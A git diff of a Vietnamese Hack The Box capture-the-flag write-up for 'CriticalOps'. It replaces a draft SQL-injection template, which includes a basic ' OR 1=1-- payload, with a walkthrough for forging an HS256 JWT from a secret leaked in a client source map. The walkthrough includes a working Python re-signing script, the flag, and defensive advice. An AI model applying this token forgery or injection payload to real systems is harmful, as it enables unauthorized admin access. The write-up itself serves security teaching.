@@ -1,14 +1,14 @@
 ---
 title: "CriticalOps"
-description: "Khai thác SQL Injection và lạm dụng quyền sudo để leo thang đặc quyền lên root."
+description: "Làm giả JWT HS256 để thay đổi role và truy cập chức năng quản trị."
 platform: "Hack The Box"
-category: "Linux"
+category: "Web"
 difficulty: "Medium"
-publishedAt: 2026-08-06
-tags: ["web", "sqli", "sql-injection", "linux", "sudo", "privesc"]
+publishedAt: 2026-08-08
+tags: ["web", "jwt", "hs256", "source-map", "authentication", "authorization"]
 language: "vi"
 translationKey: "hack-the-box/critical-ops"
-draft: true
+draft: false
 featured: false
 ---
 
@@ -16,67 +16,100 @@ featured: false
 
 ## Tổng quan
 
-[Mô tả ngắn về challenge, mục tiêu chính và kỹ thuật sử dụng]
+CriticalOps là một dashboard quản lý sự cố có khu vực **Admin Panel**. Ứng dụng lưu JWT ở phía client và dùng claim `role` để quyết định quyền truy cập. Mục tiêu là biến tài khoản thông thường thành admin bằng cách tạo lại một token hợp lệ.
 
-## Quét dịch vụ
+Lỗi nằm ở việc JWT secret được đưa vào bundle phía client/source map. Vì token sử dụng HS256, secret này đủ để ký lại token sau khi thay đổi payload.
 
-```bash
-# Quét port và dịch vụ
-nmap -sS -sC -sV [target-ip]
-```
+## Phân tích JWT
 
-[Mô tả kết quả quét và các dịch vụ phát hiện]
-
-## Phân tích ứng dụng web
-
-[Phân tích chức năng web application, các endpoint, input points]
-
-## Phát hiện SQL Injection
-
-[Các bước test và xác nhận lỗ hổng SQL Injection]
-
-```bash
-# Test payload cơ bản
-' OR 1=1--
-```
-
-## Khai thác SQL Injection
-
-[Chi tiết quá trình khai thác SQLi để dump database, lấy credentials]
-
-```bash
-# sqlmap hoặc manual exploitation
-```
-
-## Initial Access
-
-[Các bước để có shell ban đầu trên hệ thống]
-
-## Leo thang đặc quyền
-
-[Phân tích và khai thác sudo misconfiguration hoặc SUID binary]
-
-```bash
-# Liệt kê sudo privileges
-sudo -l
-```
-
-## Flag
+JWT gồm ba phần, ngăn cách bởi dấu chấm:
 
 ```text
-HTB{...}
+Header.Payload.Signature
 ```
+
+- `Header` chứa loại token và thuật toán ký, ở đây là `HS256`.
+- `Payload` chứa các claim như `userId`, `username`, `role`, `iat` và `exp`.
+- `Signature` giúp server kiểm tra token có bị sửa hay không.
+
+Header và payload chỉ được Base64URL encode, không phải mã hóa, nên có thể đọc được. Tuy nhiên, sửa payload mà không tạo signature mới sẽ làm token không hợp lệ.
+
+## Giải pháp
+
+### 1. Tìm token xác thực
+
+Sau khi đăng nhập, mở DevTools và kiểm tra cookie hoặc local storage. Ứng dụng lưu token dưới key `authToken`. Sao chép token để phân tích cục bộ; không cần gửi token thật lên dịch vụ bên thứ ba.
+
+### 2. Đọc source map để tìm secret
+
+Trong tab **Sources**, tìm `JWT_SECRET`. Source map trỏ tới file `jwt.ts`, trong đó secret bị hard-code:
+
+```javascript
+const JWT_SECRET = 'SecretKey-CriticalOps-2025';
+```
+
+Đây là lỗi thiết kế nghiêm trọng: mọi secret dùng để ký token phải nằm ở server, không được đóng gói vào JavaScript gửi cho client.
+
+### 3. Giữ claim và đổi role
+
+Đọc token hiện tại, giữ lại các claim nhận dạng và thời hạn, sau đó đổi `role` thành `admin`. Đoạn script dưới đây ký lại token bằng HMAC-SHA256:
+
+```python
+import base64
+import hashlib
+import hmac
+import json
+
+token = "PASTE_AUTH_TOKEN_HERE"
+secret = b"SecretKey-CriticalOps-2025"
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=")
+
+header_b64, payload_b64, _ = token.split(".")
+payload = json.loads(base64.urlsafe_b64decode(payload_b64 + "=="))
+payload["role"] = "admin"
+
+new_payload_b64 = b64url(json.dumps(
+    payload, separators=(",", ":")
+).encode())
+signing_input = header_b64.encode() + b"." + new_payload_b64
+signature = b64url(hmac.new(
+    secret, signing_input, hashlib.sha256
+).digest())
+
+forged_token = signing_input.decode() + "." + signature.decode()
+print(forged_token)
+```
+
+Thay giá trị `authToken` bằng token mới rồi tải lại dashboard. Claim `role=admin` được server chấp nhận vì chữ ký mới hợp lệ, từ đó khu vực Admin Panel xuất hiện.
+
+### 4. Lấy flag
+
+Trong Admin Panel, danh sách incident chứa bản ghi có tiêu đề là flag:
+
+```text
+HTB{Wh0_Put_JWT_1n_Cl13nt_S1d3_Im4g}
+```
+
+## Nguyên nhân gốc
+
+Có hai vấn đề kết hợp với nhau:
+
+1. Secret HS256 được gửi xuống client thông qua bundle/source map.
+2. Server tin claim `role` trong token mà không có cơ chế thu hồi token hoặc kiểm soát bổ sung khi secret bị lộ.
+
+JWT không mã hóa payload. Vì vậy, Base64URL không phải là biện pháp bảo mật và không thể dùng để che giấu quyền hoặc secret.
 
 ## Phòng thủ
 
-- Sử dụng prepared statements/parameterized queries
-- Input validation và sanitization
-- Principle of least privilege cho sudo
-- Regular security audits
-- WAF với rules chống SQL Injection
+- Chỉ ký và xác minh JWT ở server; không đưa `JWT_SECRET` vào client bundle, source map hoặc biến môi trường được expose cho frontend.
+- Dùng secret ngẫu nhiên, đủ dài và lưu trong secret manager; luân chuyển secret sau khi có dấu hiệu lộ lọt.
+- Allowlist thuật toán (`HS256` hoặc thuật toán được chọn) và từ chối token có `alg` ngoài dự kiến.
+- Không dùng claim client-controlled làm nguồn duy nhất để quyết định quyền. Với thao tác nhạy cảm, kiểm tra role từ server-side session hoặc database.
+- Đặt thời hạn ngắn, hỗ trợ revoke/rotation và bảo vệ cookie bằng `HttpOnly`, `Secure` và `SameSite` phù hợp.
+- Tắt source map trong production hoặc bảo đảm source map không chứa secret và thông tin nhạy cảm.
 
 ## Bài học
 
-- Điều gì đã hiệu quả?
-- Hướng nào đã thất bại?
-- Có thể phòng thủ như thế nào?
+Khi thấy JWT ở client, cần phân biệt việc decode payload với việc tạo token hợp lệ. Với HS256, secret bị lộ biến mọi claim thành dữ liệu có thể giả mạo; kiểm tra bundle và source map thường là bước quyết định.
